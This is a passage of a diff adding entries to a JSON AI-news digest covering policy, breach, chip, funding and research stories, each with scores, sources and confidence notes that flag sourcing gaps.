+          "impact": 0.5,
+          "novelty": 0.5,
+          "credibility": 0.834,
+          "breadth": 0.565,
+          "momentum": 0.608
+        },
+        "coverage": 5,
+        "mentions": 5,
+        "baseline": 4.333,
+        "verified": true
+      },
+      "placement": "brief",
+      "rank": 10
+    },
+    {
+      "id": "white-house-ai-task-force-12-month-liability-relief-incident-reporting",
+      "title": "White House AI task force urges agencies to give firms 12 months' liability relief for reporting AI cyber incidents",
+      "summary": "At a Thursday (Nov 12) meeting, officials from President Trump's AI task force recommended that federal agencies ease cyber-liability policies so AI companies report critical incidents. The core proposal is at least 12 months of relief from regulatory liability for good-faith voluntary disclosure of vulnerabilities and incidents, plus a voluntary channel for AI incident reports, with the government sharing defensive information back to industry. No agency, definition of an incident or timeline has been set.",
+      "why_it_matters": "The US is relying on voluntary safe-harbour reporting just as Australia and the UK move toward mandatory AI-incident reporting. Frontier labs and their cloud partners would be the main beneficiaries.",
+      "key_numbers": [
+        "≥12 months liability relief (proposed)"
+      ],
+      "topic": "policy",
+      "region": "us",
+      "entities": [
+        "White House",
+        "US federal agencies"
+      ],
+      "tickers": [],
+      "published_at": "2026-11-14T00:34:34Z",
+      "sources": [
+        {
+          "url": "https://www.bloomberg.com/news/articles/2026-11-14/white-house-urges-easing-liability-to-encourage-ai-disclosure",
+          "outlet": "Bloomberg",
+          "lang": "en",
+          "tier": "press",
+          "title": "White House Urges Easing Liability to Encourage AI Disclosure"
+        },
+        {
+          "url": "https://casrai.org/news/white-house-ai-task-force-incident-report-shield-2026",
+          "outlet": "CASRAI",
+          "lang": "en",
+          "tier": "trade",
+          "title": "AI Task Force Urges 12-Month Reporting Relief"
+        },
+        {
+          "url": "https://startupfortune.com/white-house-ai-task-force-urges-12-months-of-liability-relief-for-firms-that-report-cyber-incidents/",
+          "outlet": "Startup Fortune",
+          "lang": "en",
+          "tier": "trade",
+          "title": "White House AI task force urges 12 months of liability relief for firms that report cyber incidents"
+        }
+      ],
+      "coverage": 4,
+      "impact": 0.5,
+      "novelty": 0.6,
+      "follow_up_of": null,
+      "confidence_note": "No White House readout URL was seen; facts come from Bloomberg's and trade outlets' snippets. Sources differ on the task force's name and on officials' name spellings, so those are omitted.",
+      "score": {
+        "total": 56.9,
+        "components": {
+          "impact": 0.5,
+          "novelty": 0.6,
+          "credibility": 0.691,
+          "breadth": 0.487,
+          "momentum": 0.632
+        },
+        "coverage": 4,
+        "mentions": 1,
+        "baseline": 0.0,
+        "verified": true
+      },
+      "placement": "brief",
+      "rank": 11
+    },
+    {
+      "id": "cursor-breach-fireworks-key-malicious-claude-code-extension",
+      "title": "Cursor traces its breach to a key leaked by Fireworks AI; tampered Claude Code extension reached up to 5,000 users",
+      "summary": "Cursor published the findings of its two-week investigation. An attacker used a Cursor access key exposed in the Fireworks AI breach to copy historical coding-agent traces and credentials, then reached some of Cursor's SaaS tools. A stolen credential let the attacker plant tampered copies of Anthropic's Claude Code extension (versions 2.1.312 and 2.1.313) in Cursor's VS Code marketplace cache for about 11 hours. Up to 5,000 users may have installed them, and researchers say the payload installed SSH backdoors. Cursor says fewer than 0.01% of customers had API credentials exposed, Privacy Mode prompts and code were not in the stolen data, and the last attacker activity it saw was on Nov 1.",
+      "why_it_matters": "The Fireworks breach has now spread into a supply-chain attack on a major AI coding tool. Inference providers that hold customer keys and traces are a systemic weak point for the agent and dev-tool stack.",
+      "key_numbers": [
+        "Up to 5,000 users",
+        "~11 hours exposure",
+        "<0.01% of customers had API credentials exposed"
+      ],
+      "topic": "products",
+      "region": "us",
+      "entities": [
+        "Cursor",
+        "Fireworks AI",
+        "Anthropic"
+      ],
+      "tickers": [],
+      "published_at": "2026-11-13T20:00:00Z",
+      "sources": [
+        {
+          "url": "https://cursor.com/blog/security-incident-update",
+          "outlet": "Cursor",
+          "lang": "en",
+          "tier": "primary",
+          "title": "An update on our recent security incident"
+        },
+        {
+          "url": "https://www.bleepingcomputer.com/news/security/cursor-confirms-security-breach-led-to-malicious-claude-code-extension/",
+          "outlet": "BleepingComputer",
+          "lang": "en",
+          "tier": "trade",
+          "title": "Cursor confirms security breach led to malicious Claude Code extension"
+        },
+        {
+          "url": "https://unite.ai/cursor-traces-breach-to-access-key-exposed-by-fireworks-ai",
+          "outlet": "Unite.AI",
+          "lang": "en",
+          "tier": "trade",
+          "title": "Cursor Traces Breach to Access Key Exposed by Fireworks AI"
+        },
+        {
+          "url": "https://www.ithome.com/1/027/215.htm",
+          "outlet": "IT之家",
+          "lang": "zh",
+          "tier": "trade",
+          "title": "Cursor 披露安全事件调查结果，恶意 Claude Code 扩展最多波及 5000 用户"
+        }
+      ],
+      "coverage": 5,
+      "impact": 0.5,
+      "novelty": 0.4,
+      "follow_up_of": "fireworks-ai-breach-widens-model-weights-datasets",
+      "confidence_note": "The publication time is an estimate: IT之家 says Cursor disclosed the findings on Nov 13 local time, and no exact timestamp was seen. The tampered-extension incident was first disclosed on Oct 29; what is new is the root cause (the Fireworks key) and the final scope. The SSH-backdoor detail comes from a third-party researcher via BleepingComputer.",
+      "score": {
+        "total": 55.8,
+        "components": {
+          "impact": 0.5,
+          "novelty": 0.4,
+          "credibility": 0.775,
+          "breadth": 0.565,
+          "momentum": 0.632
+        },
+        "coverage": 5,
+        "mentions": 1,
+        "baseline": 0.0,
+        "verified": true
+      },
+      "placement": "brief",
+      "rank": 12
+    },
+    {
+      "id": "eu-leaders-ai-summit-dublin-30bn-gigafactories-500bn",
+      "title": "EU leaders hold first AI summit; von der Leyen says €30B mobilised for seven AI gigafactories, €500B needed",
+      "summary": "At EU leaders' first dedicated AI discussion in Dublin on Nov 13, Commission President Ursula von der Leyen said seven AI gigafactories are being planned with about €30B mobilised: up to €10B of EU and national money intended to draw at least €20B of private capital. She said Europe needs at least €500B for tech sovereignty and promised an 'ambitious proposal', with a first part reportedly due in about two weeks. The gigafactories must be EU-sited, with core infrastructure under European control.",
+      "why_it_matters": "The EU has put a figure on its sovereign-compute ambition and set a near-term deadline for a funding proposal. This matters for European data-centre builders and for US chip vendors bidding on gigafactory clusters.",
+      "key_numbers": [
+        "7 AI gigafactories",
+        "~€30B mobilised (≤€10B public, ≥€20B private)",
+        "≥€500B tech-sovereignty need"
+      ],
+      "topic": "policy",
+      "region": "eu",
+      "entities": [
+        "European Commission",
+        "European Council",
+        "Ursula von der Leyen"
+      ],
+      "tickers": [],
+      "published_at": "2026-11-14T00:00:00Z",
+      "sources": [
+        {
+          "url": "https://sofiaglobe.com/2026/11/14/eu-to-mobilise-billions-of-euro-for-ai-gigafactories-europes-tech-sovereignty/",
+          "outlet": "The Sofia Globe",
+          "lang": "en",
+          "tier": "press",
+          "title": "EU to mobilise billions of euro for AI Gigafactories, Europe's tech sovereignty"
+        },
+        {
+          "url": "https://english.news.cn/20261114/28e9a81021724234ad09d5f86aaea9a6/c.html",
+          "outlet": "Xinhua",
+          "lang": "en",
+          "tier": "press",
+          "title": "Roundup: EU leaders discuss AI competitiveness, agree on Ukraine peace talks team"
+        },
+        {
+          "url": "https://eualive.net/eu-leaders-hold-first-high-level-ai-talks-in-dublin/",
+          "outlet": "EU Alive",
+          "lang": "en",
+          "tier": "trade",
+          "title": "EU leaders hold first high-level AI talks in Dublin, agree on European team for Ukraine peace talks"
+        },
+        {
+          "url": "https://table.media/en/europe/feature/ai-gigafactories-how-seven-new-factories-are-expected-to-help-europe-catch-up-in-ai",
+          "outlet": "Table.Briefings",
+          "lang": "en",
+          "tier": "trade",
+          "title": "AI gigafactories: How seven new factories are expected to help Europe catch up in AI"
+        }
+      ],
+      "coverage": 5,
+      "impact": 0.5,
+      "novelty": 0.4,
+      "follow_up_of": null,
+      "confidence_note": "The remarks were made on Nov 13 in Dublin at an unknown time, possibly more than 6h before the window. published_at is set to the date of the earliest dated sources (Nov 14) and is an estimate. The €30B gigafactory tender itself was launched July 30, so the new elements are the €500B figure and the promised proposal. Facts come from snippets.",
+      "score": {
+        "total": 55.8,
+        "components": {
+          "impact": 0.5,
+          "novelty": 0.4,
+          "credibility": 0.773,
+          "breadth": 0.565,
+          "momentum": 0.632
+        },
+        "coverage": 5,
+        "mentions": 1,
+        "baseline": 0.0,
+        "verified": true
+      },
+      "placement": "brief",
+      "rank": 13
+    },
+    {
+      "id": "empyrean-s2c-yakehongyu-merge-hypers2c-eda",
+      "title": "Empyrean-backed merger of S2C and Yakehongyu forms HyperS2C, a combined Chinese digital front-end EDA platform",
+      "original_title": "华大九天联合大湾区基金完成国产数字前端 EDA 专业化整合，新公司“新禹思”成立",
+      "summary": "At IC China 2026 in Beijing, EDA leader Empyrean Technology (华大九天) and the Greater Bay Area Technology Innovation Industry Investment Fund announced that FPGA-prototyping and verification firms S2C (思尔芯) and Yakehongyu (亚科鸿禹) have merged. The new company is called HyperS2C (新禹思). It claims 205 patents, 200 software copyrights and more than 800 customers worldwide, with digital front-end coverage from architecture design to system-level verification. Empyrean says it will link the new company's tools with its own analog, digital and foundry tool chains.",
+      "why_it_matters": "US controls cut Chinese chip designers, including AI-accelerator makers, off from Cadence and Synopsys. Combining China's two main hardware-assisted verification vendors under Empyrean fills one of the weakest gaps in a domestic EDA flow.",
+      "key_numbers": [
+        "205 patents",
+        "200 software copyrights",
+        "800+ customers"
+      ],
+      "topic": "compute",
+      "region": "cn",
+      "entities": [
+        "Empyrean Technology",
+        "S2C",
+        "Yakehongyu"
+      ],
+      "tickers": [
+        "301269.SZ"
+      ],
+      "published_at": "2026-11-14T13:07:04Z",
+      "sources": [
+        {
+          "url": "https://www.ithome.com/1/027/230.htm",
+          "outlet": "IT之家",
+          "lang": "zh",
+          "tier": "trade",
+          "title": "华大九天联合大湾区基金完成国产数字前端 EDA 专业化整合，新公司“新禹思”成立"
+        },
+        {
+          "url": "https://news.10jqka.com.cn/20261014/c680656593.shtml",
+          "outlet": "同花顺",
+          "lang": "zh",
+          "tier": "press",
+          "title": "北京华大九天科技股份有限公司 第二届董事会第二十九次会议决议公告"
+        }
+      ],
+      "coverage": 1,
+      "impact": 0.4,
+      "novelty": 0.6,
+      "follow_up_of": null,
+      "confidence_note": "Only IT之家 reports the launch event; search found no second outlet. Deal terms, ownership split and valuation were not disclosed. The 10jqka link is Empyrean's Oct 14 board resolution approving a capital increase into Yakehongyu and S2C (background, not coverage of the Nov 14 event). English name HyperS2C per IT之家. Ticker 301269.SZ not verified against an exchange listing.",
+      "score": {
+        "total": 48.3,
+        "components": {
+          "impact": 0.4,
+          "novelty": 0.6,
+          "credibility": 0.587,
+          "breadth": 0.283,
+          "momentum": 0.632
+        },
+        "coverage": 2,
+        "mentions": 1,
+        "baseline": 0.0,
+        "verified": true
+      },
+      "placement": "brief",
+      "rank": 14,
+      "quota": "cn"
+    },
+    {
+      "id": "huawei-kirin-9050-maliang-gpu-ai-isp-details",
+      "title": "Huawei details Kirin 9050 GPU and AI ISP: +40% GPU performance, 45% lower power, 200MP fusion photos",
+      "original_title": "华为麒麟 9050 系列新马良 GPU、AI ISP 情报公开：实装二代硬件光追，首次实现 2 亿像素融合拍照",
+      "summary": "Huawei published more specs for the Kirin 9050 series, its first 'logic-folding' chip. The new 4th-generation Maliang GPU microarchitecture delivers 40% more performance at 45% lower power, and second-generation hardware ray tracing is 78% faster. The AI ISP pairs a pixel-dedicated NPU with the general NPU for real-time 4K60 processing and, for the first time, 200MP fused photos.",
+      "why_it_matters": "Huawei is drip-feeding specs for its domestically made flagship SoC ahead of the Mate 90. On-device AI performance on a chip built under sanctions is a signal for China's self-sufficient phone and edge-AI stack.",
+      "key_numbers": [
+        "GPU +40% performance",
+        "GPU power -45%",
+        "Ray tracing +78%",
+        "200MP fusion photos"
+      ],
+      "topic": "compute",
+      "region": "cn",
+      "entities": [
+        "Huawei"
+      ],
+      "tickers": [],
+      "published_at": "2026-11-14T09:09:09Z",
+      "sources": [
+        {
+          "url": "https://www.ithome.com/1/027/181.htm",
+          "outlet": "IT之家",
+          "lang": "zh",
+          "tier": "trade",
+          "title": "华为麒麟 9050 系列新马良 GPU、AI ISP 情报公开：实装二代硬件光追，首次实现 2 亿像素融合拍照"
+        }
+      ],
+      "coverage": 1,
+      "impact": 0.3,
+      "novelty": 0.3,
+      "follow_up_of": null,
+      "confidence_note": "All figures are Huawei's official claims as relayed by IT之家; there is no independent testing. The Kirin 9050 and logic folding were first unveiled around Oct 4, so this is incremental.",
+      "score": {
+        "total": 29.6,
+        "components": {
+          "impact": 0.3,
+          "novelty": 0.3,
+          "credibility": 0.25,
+          "breadth": 0.154,
+          "momentum": 0.576
+        },
+        "coverage": 1,
+        "mentions": 1,
+        "baseline": 0.167,
+        "verified": false
+      },
+      "placement": "brief",
+      "rank": 15,
+      "quota": "cn"
+    },
+    {
+      "id": "wsj-nvidia-funded-startups-gpu-demand-kress-pushback",
+      "title": "WSJ report says Nvidia funded startups to buy its GPUs; Kress reportedly pushed to cut circular deals",
+      "summary": "As relayed by TechPowerUp and Wccftech, a Wall Street Journal report alleges that Nvidia invested in AI startups and smaller clouds that then bought its GPUs, which sustained the perception of scarcity and absorbed surplus TSMC output. It describes an August meeting where CFO (now interim CEO) Colette Kress pushed to scale back circular-financing commitments and Huang reacted harshly. Secondary accounts say the OpenAI-linked guarantee was cut from about 8 GW (up to $250B) under discussion to about 4.25 GW. Nvidia has publicly argued that its OpenAI lease guarantee is not circular financing.",
+      "why_it_matters": "If the report holds up, it reframes how much of Nvidia's demand it financed itself. Kress, who reportedly resisted those deals, now runs the company, which could mean fewer vendor-financed startups and neoclouds.",
+      "key_numbers": [
+        "~8 GW / up to $250B discussed",
+        "~4.25 GW signed cap (reported)"
+      ],
+      "topic": "business",
+      "region": "us",
+      "entities": [
+        "Nvidia",
+        "Colette Kress",
+        "Jensen Huang",
+        "OpenAI",
+        "TSMC"
+      ],
+      "tickers": [
+        "NVDA"
+      ],
+      "published_at": "2026-11-14T02:52:59Z",
+      "sources": [
+        {
+          "url": "https://www.techpowerup.com/354814/nvidia-allegedly-engineered-scarcity-by-funding-ai-startups-to-buy-its-gpus",
+          "outlet": "TechPowerUp",
+          "lang": "en",
+          "tier": "trade",
+          "title": "NVIDIA Allegedly Engineered Scarcity By Funding AI Startups To Buy Its GPUs"
+        },
+        {
+          "url": "https://wccftech.com/jensen-huang-financed-ai-startups-absorb-excess-silicon/",
+          "outlet": "Wccftech",
+          "lang": "en",
+          "tier": "trade",
+          "title": "Instead Of Lowering GPU Prices, Former NVIDIA CEO Jensen Huang Reportedly Financed AI Startups To Absorb Excess Silicon, Shattering The Shortage Perception"
+        },
+        {
+          "url": "https://gameriv.com/nvidia-reportedly-funded-ai-companies-to-keep-buying-its-gpus-amid-supply-concerns/",
+          "outlet": "GameRiv",
+          "lang": "en",
+          "tier": "trade",
+          "title": "NVIDIA Reportedly Funded AI Companies to Keep Buying Its GPUs Amid Supply Concerns"
+        }
+      ],
+      "coverage": 4,
+      "impact": 0.5,
+      "novelty": 0.6,
+      "follow_up_of": null,
+      "confidence_note": "The original WSJ article was not found or accessed (wsj.com is blocked to the search tool), so all details are secondhand via trade outlets, and its exact date and time are unknown. published_at is the TechPowerUp post (HN 1005 points). Accounts of the signed cap differ ($125B in some write-ups; another says Nvidia's filing shows a $105B cap). No Nvidia comment was seen.",
+      "score": {
+        "total": 54.4,
+        "components": {
+          "impact": 0.5,
+          "novelty": 0.6,
+          "credibility": 0.578,
+          "breadth": 0.487,
+          "momentum": 0.608
+        },
+        "coverage": 4,
+        "mentions": 5,
+        "baseline": 4.333,
+        "verified": true
+      },
+      "placement": "noted",
+      "rank": 16
+    },
+    {
+      "id": "coxon-anthropic-mythos-retrain-fraction-compute",
+      "title": "Ex-Anthropic researcher says an IPO roadshow chart shows Mythos could now be retrained for a fraction of its compute",
+      "summary": "Jacob Coxon, a pretraining researcher who left Anthropic in September after about four months, posted that a slide from Anthropic's IPO roadshow was a major reason he quit. The slide is titled 'Pre-training compute multiplier over time (code)' and plots July 2024 to October 2026 on a log scale. He argued that it shows superexponential gains in algorithmic efficiency, and wrote that Anthropic 'could already retrain Mythos with a fraction of the compute originally needed', without putting a number on the fraction. Anthropic labels the data points as internal estimates for illustration only.",
+      "why_it_matters": "The claim lands days before Anthropic's IPO pricing and feeds the debate over whether algorithmic progress is automating itself. It also implies frontier capability is getting cheaper to reproduce, which erodes compute moats.",
+      "key_numbers": [
+        "Chart spans Jul 2024–Oct 2026 (log scale)",
+        "~4 months at Anthropic"
+      ],
+      "topic": "models",
+      "region": "us",
+      "entities": [
+        "Anthropic"
+      ],
+      "tickers": [],
+      "published_at": "2026-11-13T19:56:17Z",
+      "sources": [
+        {
+          "url": "https://x.com/hilbertspaess/status/2121331333654086124",
+          "outlet": "X (Jacob Coxon)",
+          "lang": "en",
+          "tier": "social",
+          "title": "This slide from the Anthropic IPO roadshow was a big factor in my decision to leave..."
+        },
+        {
+          "url": "https://the-decoder.com/anthropic-can-already-retrain-mythos-with-a-fraction-of-the-compute-originally-needed-says-former-researcher-coxon/",
+          "outlet": "The Decoder",
+          "lang": "en",
+          "tier": "trade",
+          "title": "Anthropic can already retrain Mythos with \"a fraction of the compute originally needed,\" says former researcher Coxon"
+        },
+        {
+          "url": "https://www.ithome.com/1/027/221.htm",
+          "outlet": "IT之家",
+          "lang": "zh",
+          "tier": "trade",
+          "title": "前 Anthropic 研究员考克森：当今若要重新训练 Mythos，只需初始的一小部分算力"
+        },
+        {
+          "url": "https://cryptobriefing.com/former-anthropic-researcher-ipo-slide-departure/",
+          "outlet": "Crypto Briefing",
+          "lang": "en",
+          "tier": "trade",
+          "title": "Former Anthropic researcher says an IPO roadshow slide helped push him out"
+        }
+      ],
+      "coverage": 6,
+      "impact": 0.4,
+      "novelty": 0.5,
+      "follow_up_of": null,
+      "confidence_note": "The post time comes from decoding the X status ID (19:56Z Nov 13, about 1.9h before the window opens). This is one ex-employee's interpretation of a chart Anthropic labels illustrative; Anthropic has not commented.",
+      "score": {
+        "total": 52.5,
+        "components": {
+          "impact": 0.4,
+          "novelty": 0.5,
+          "credibility": 0.578,
+          "breadth": 0.632,
+          "momentum": 0.744
+        },
+        "coverage": 6,
+        "mentions": 5,
+        "baseline": 2.667,
+        "verified": true
+      },
+      "placement": "noted",
+      "rank": 17
+    },
+    {
+      "id": "anthropic-building-strong-safety-evaluations",
+      "title": "Anthropic publishes guidance on building safety evals, showing one model scored 60% or 94% depending on setup",
+      "summary": "Anthropic published 'Building strong safety evaluations', a set of recommendations for designing, running and reporting safety evals, drawn from its own system-card work. The advice covers defining the construct before collecting data, preregistration, checking automated graders against human judgment, multi-turn simulations for sensitive requests, and reporting uncertainty alongside scores. Coverage highlights one example: the same model scored 60% via the API and 94% on claude.ai on a suicide and self-harm eval, a gap attributed to the system prompt.",
+      "why_it_matters": "Eval scores feed system cards, the RSP and regulators' registration regimes such as New York's RAISE Act. A 34-point swing from deployment context alone shows how fragile single-number safety claims are.",
+      "key_numbers": [
+        "60% (API) vs 94% (claude.ai) on the same self-harm eval"
+      ],
+      "topic": "research",
+      "region": "us",
+      "entities": [
+        "Anthropic"
+      ],
+      "tickers": [],
+      "published_at": "2026-11-13T18:06:18Z",
+      "sources": [
+        {
+          "url": "https://www.anthropic.com/research/building-strong-safety-evaluations",
+          "outlet": "Anthropic",
+          "lang": "en",
+          "tier": "primary",
+          "title": "Building strong safety evaluations"
+        },
+        {
+          "url": "https://casrai.org/news/anthropic-strong-safety-evaluation-recommendations-2026",
+          "outlet": "CASRAI",
+          "lang": "en",
+          "tier": "trade",
+          "title": "Anthropic urges stronger AI safety evaluations"
+        },
+        {
+          "url": "https://fourweekmba.com/ai-anthropic-safety-evals-same-model-scored-34-points-apart/",
+          "outlet": "FourWeekMBA",
+          "lang": "en",
+          "tier": "trade",
+          "title": "Anthropic Safety Evals: Same Model Scored 34 Points Apart"
+        }
+      ],
+      "coverage": 4,
+      "impact": 0.4,
+      "novelty": 0.4,
+      "follow_up_of": null,
+      "confidence_note": "Published about 3.7h before the window opens. The primary page was not fetched. The 60%/94% figure comes from two secondary write-ups (FourWeekMBA and CellCog), which also disagree on how many recommendations the post makes.",
+      "score": {
+        "total": 52.2,
+        "components": {
+          "impact": 0.4,
+          "novelty": 0.4,
+          "credibility": 0.775,
+          "breadth": 0.487,
+          "momentum": 0.744
+        },
+        "coverage": 4,
+        "mentions": 5,
+        "baseline": 2.667,
+        "verified": true
+      },
+      "placement": "noted",
+      "rank": 18
+    },
+    {
+      "id": "google-antigravity-teamwork-science-engineering-results",
+      "title": "Google Research reports results from Antigravity's /teamwork multi-agent mode on maths, chemistry and systems code",
+      "summary": "A Google Research post says Antigravity's /teamwork multi-agent campaigns, paired with objective evaluators such as test suites, benchmarks and hardware timers, have tackled open problems in mathematics, chemistry, systems software and ML engineering, including multi-day engineering projects. Coverage cites three results. A Teamwork-LEAP system wrote about 1.8M lines of Lean to formalise the Weil conjectures. Thirty specialised agents reached 95% accuracy in identifying molecular structures from NMR data. A Rust rewrite of Google's AV1 decoder ran 20–30% faster than the original C++.",
+      "why_it_matters": "Google is presenting long-running agent teams with hard verifiers as a research tool, not just a coding assistant. That competes directly with Anthropic's and OpenAI's agentic-science pitches.",
+      "key_numbers": [
+        "~1.8M lines of Lean (Weil conjectures)",
+        "95% NMR structure-ID accuracy with 30 agents",
+        "AV1 decoder Rust rewrite 20–30% faster than C++"
+      ],
+      "topic": "research",
+      "region": "us",
+      "entities": [
+        "Google"
+      ],
+      "tickers": [
+        "GOOGL"
+      ],
+      "published_at": "2026-11-13T20:47:18Z",
+      "sources": [
+        {
+          "url": "https://research.google/blog/advancing-science-engineering-with-antigravitys-teamwork-feature/",
+          "outlet": "Google Research",
+          "lang": "en",
+          "tier": "primary",
+          "title": "Advancing science & engineering with Antigravity's /teamwork"
+        },
+        {
+          "url": "https://interestingengineering.com/ai-robotics/google-antigravity-multi-agent-research",
+          "outlet": "Interesting Engineering",
+          "lang": "en",
+          "tier": "trade",
+          "title": "Google's Antigravity agents formalise major mathematical proofs"
+        }
+      ],
+      "coverage": 3,
+      "impact": 0.5,
+      "novelty": 0.6,
+      "follow_up_of": null,
+      "confidence_note": "Published about 1h before the window opens. The primary page could not be fetched. The Weil/Lean and NMR figures come from a single secondary outlet (Interesting Engineering). /teamwork launched in August, so this post reports results, not a new launch.",
+      "score": {
+        "total": 51.8,
+        "components": {
+          "impact": 0.5,
+          "novelty": 0.6,
+          "credibility": 0.7,
+          "breadth": 0.393,
+          "momentum": 0.239
+        },
+        "coverage": 3,
+        "mentions": 1,
+        "baseline": 2.667,
+        "verified": true
+      },
+      "placement": "noted",
+      "rank": 19
+    },
+    {
+      "id": "ai2-xybench-misconception-queries",
+      "title": "Ai2's XYBench finds LLMs answer the literal question over the user's real goal",
+      "summary": "Ai2 released XYBench (EMNLP 2026), 8,115 queries built around a buried misconception (the 'XY problem'), drawn from Stack Overflow/Stack Exchange and WikiHow. It tested Claude Sonnet 4.6, GPT-5, Gemini 3.1 Pro, Qwen3.5-9B and DeepSeek-V4 Pro. Every model favoured the stated request: on Stack Overflow, 59–71% of answers included a fix for the underlying goal, but only 35–41% made it the focus. In multiple choice, models picked the goal-focused answer 71–84% of the time, so Ai2 frames the gap as a post-training and product-design issue, not a knowledge gap.",
+      "why_it_matters": "The benchmark measures a practical helpfulness failure that leaderboards miss, and the gap between recognising the right answer and generating it points to fixes at the post-training stage.",
+      "key_numbers": [
+        "8,115 queries",
+        "59–71% goal-solution vs 35–41% goal-emphasis (Stack Overflow)",
+        "71–84% pick goal-focused option in multiple choice"
+      ],
+      "topic": "research",
+      "region": "us",
+      "entities": [
+        "Ai2"
+      ],
+      "tickers": [],
+      "published_at": "2026-11-13T17:02:35Z",
+      "sources": [
+        {
+          "url": "https://huggingface.co/blog/allenai/xybench",
+          "outlet": "Hugging Face (Ai2)",
+          "lang": "en",
+          "tier": "primary",
+          "title": "XYBench: Helping with the problem behind the question"
+        },
+        {
+          "url": "https://aclanthology.org/2026.emnlp-main.2646/",
+          "outlet": "ACL Anthology",
+          "lang": "en",
+          "tier": "primary",
+          "title": "XYBench: Can LLMs Respond Pragmatically to Queries with Misconceptions?"
+        },
+        {
+          "url": "https://aiweekly.co/alerts/allen-ais-xybench-shows-top-llms-answer-the-wrong-question",
+          "outlet": "AI Weekly",
+          "lang": "en",
+          "tier": "trade",
+          "title": "Allen AI's XYBench shows top LLMs answer the wrong question"
+        }
+      ],
+      "coverage": 3,
+      "impact": 0.3,
+      "novelty": 0.5,
+      "follow_up_of": null,
+      "confidence_note": "The blog post went up about 4.8h before the window opens. The paper has been on arXiv since September, so only the blog and the EMNLP release are new. The model list is older than the current frontier. The figures come from snippets.",
+      "score": {
+        "total": 50.3,
+        "components": {
+          "impact": 0.3,
+          "novelty": 0.5,
+          "credibility": 0.88,
+          "breadth": 0.393,
+          "momentum": 0.632
+        },
+        "coverage": 3,
+        "mentions": 1,
+        "baseline": 0.0,
+        "verified": true
+      },
+      "placement": "noted",
+      "rank": 20
+    },
+    {
+      "id": "foundation-robotics-missed-payroll-ceo-4-6m-loan",
+      "title": "Eric Trump-backed military robot startup Foundation misses payroll; CEO had borrowed $4.6M from company for home",
+      "summary": "CNBC reports that Foundation Future Industries, a humanoid military-robot maker backed by Eric Trump and holder of a reported $24M Pentagon contract, missed its Oct 30 payroll after running low on cash, its second shortfall since August. CEO Sankaet Pathak, who is the sole board member and majority owner, borrowed $4.6M from the company to buy a home, according to people familiar with the matter. Pathak did not respond to the allegations in the report.",
+      "why_it_matters": "It is a governance red flag in defence-robotics funding as the humanoid sector raises large rounds. It could also draw scrutiny of Pentagon contracts with politically connected startups.",
+      "key_numbers": [
+        "$4.6M CEO loan",
+        "missed Oct 30 payroll",
+        "$24M Pentagon contract (reported)"
+      ],
+      "topic": "business",
+      "region": "us",
+      "entities": [
+        "Foundation Future Industries",
+        "Sankaet Pathak",
+        "Eric Trump"
+      ],
+      "tickers": [],
+      "published_at": "2026-11-14T12:00:01Z",
+      "sources": [
+        {
+          "url": "https://www.cnbc.com/2026/11/14/foundation-payroll-ceo-loan.html",
+          "outlet": "CNBC",
+          "lang": "en",
+          "tier": "press",
+          "title": "Eric Trump-backed robot soldier startup can't pay staff after founder borrowed $4.6 million from company to buy home"
+        },
+        {
+          "url": "https://www.msn.com/en-us/money/general/a-robot-startup-won-a-24-million-pentagon-contract-then-it-couldn-t-make-payroll/ar-AA2hquBQ",
+          "outlet": "MSN",
+          "lang": "en",
+          "tier": "press",
+          "title": "A robot startup won a $24 million Pentagon contract. Then it couldn't make payroll."
+        }
+      ],
+      "coverage": 3,
+      "impact": 0.3,
+      "novelty": 0.5,
+      "follow_up_of": null,
+      "confidence_note": "The story rests on CNBC's anonymous sourcing. Sources disagree on when the loan was made (2023 vs Oct 2025). The MSN piece's originating outlet is unknown, and the $24M contract figure comes from its headline only.",
+      "score": {
+        "total": 46.7,
+        "components": {
+          "impact": 0.3,
+          "novelty": 0.5,
+          "credibility": 0.698,
+          "breadth": 0.393,
+          "momentum": 0.632
+        },
+        "coverage": 3,
+        "mentions": 1,
+        "baseline": 0.0,
+        "verified": true
+      },
+      "placement": "noted",
+      "rank": 21
+    },
+    {
+      "id": "digital-realty-10bn-more-japan-data-centers",
+      "title": "Digital Realty to spend $10B more on Japan data centres, aiming to roughly quadruple capacity, CEO tells Nikkei",
+      "summary": "Digital Realty CEO Andy Power told Nikkei Asia that the US data-centre REIT will spend about $10B more in Japan, its biggest Asian market, and nearly quadruple capacity there. Digital Realty operates in Japan through MC Digital Realty, a 50:50 joint venture with Mitsubishi Corp., whose projects include the Inzai (Tokyo) and Osaka campuses.",
+      "why_it_matters": "It is one of the largest single-country colocation commitments in Asia. It adds to the Japan AI-capacity race alongside the hyperscalers' multi-billion-dollar pledges, where power and land are the constraints.",
+      "key_numbers": [
+        "~$10B additional investment",
+        "~4x Japan capacity"
+      ],
+      "topic": "compute",
+      "region": "other",
+      "entities": [
+        "Digital Realty",
+        "Mitsubishi Corporation",
+        "MC Digital Realty"
+      ],
+      "tickers": [
+        "DLR"
+      ],
+      "published_at": "2026-11-14T19:50:00Z",
+      "sources": [
+        {
+          "url": "https://asia.nikkei.com/business/technology/artificial-intelligence/digital-realty-trust-to-spend-10bn-more-on-japan-data-centers-ceo",
+          "outlet": "Nikkei Asia",
+          "lang": "en",
+          "tier": "press",
+          "title": "Digital Realty Trust to spend $10bn more on Japan data centers: CEO"
+        }
+      ],
+      "coverage": 1,
+      "impact": 0.5,
+      "novelty": 0.5,
+      "follow_up_of": null,
+      "confidence_note": "Single source, and only the headline and subhead were seen (the subhead says 'nearly quadruple capacity'). Timeline, baseline capacity and JV structure are unconfirmed. Nikkei dates the article Nov 15 JST; published_at is the harvest timestamp.",
+      "score": {
+        "total": 45.1,
+        "components": {
+          "impact": 0.5,
+          "novelty": 0.5,
+          "credibility": 0.45,
+          "breadth": 0.154,
+          "momentum": 0.632
+        },
+        "coverage": 1,
+        "mentions": 1,
+        "baseline": 0.0,
+        "verified": false
+      },
+      "placement": "noted",
+      "rank": 22
+    },
+    {
+      "id": "china-disruptive-tech-industrialization-index-2025",
+      "title": "China's disruptive-technology industrialisation index rose 58.6% over 2020-2025, covering fields including embodied AI",
+      "original_title": "2020-2025 年，我国颠覆性技术产业化指数累计增幅超五成",
+      "summary": "Xinhua, relayed by IT之家, reports that the Disruptive Technology Industrialization Index Report was released at the 2026 Enterprise Sci-Tech Innovation Development Forum in Tianjin (Nov 13-14). The index rose from a base of 100 in 2020 to 158.63 in 2025, a 58.63% cumulative gain and about 9.67% compound annual growth. It covers 10 fields including high-temperature superconductors, controllable fusion, hydrogen and embodied intelligence. The Ministry of Science and Technology's Fourth Department guided the report.",
